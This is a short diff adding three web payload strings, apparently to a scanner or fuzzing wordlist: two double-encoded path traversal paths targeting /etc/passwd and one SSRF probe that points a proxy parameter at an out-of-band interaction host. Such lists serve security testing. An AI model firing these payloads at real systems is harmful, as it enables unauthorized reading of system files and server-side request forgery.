@@ -1,0 +1,3 @@
+/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development
+/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
+/proxy.stream?origin=http://{{interactsh-url}}
